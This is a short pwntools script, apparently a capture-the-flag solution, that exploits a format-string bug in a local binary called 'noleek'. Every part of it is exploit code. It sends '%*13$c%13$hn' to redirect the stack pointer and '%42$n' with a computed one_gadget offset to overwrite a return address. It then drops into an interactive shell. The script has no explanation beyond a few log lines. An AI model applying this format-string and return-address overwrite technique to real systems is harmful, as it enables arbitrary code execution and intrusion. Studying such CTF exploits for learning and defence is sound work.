from pwn import *

log.info("Exploit can fail quite often. Retry a lot before despairing.")

if args['REMOTE']:
    c = remote('127.0.0.1', 5000)
else:
    c = process('./noleek')
    pause()

log.info("Redirect stack pointer")
c.recvuntil(b'leek? ')
payload = f'%{0xff10}c'
payload += '%*13$c'
payload += '%13$hn'
c.sendline(payload.encode())

log.info("Overwrite return address")
c.recvuntil(b'more leek? ')
libc_start_main = 0x23d0a
one_gadget = 0xc9620
delta = one_gadget - libc_start_main
payload = f'%{delta}c'
payload += '%*12$c'
payload += '%42$n'
c.sendline(payload.encode())

c.recvuntil(b'noleek.')

c.interactive()
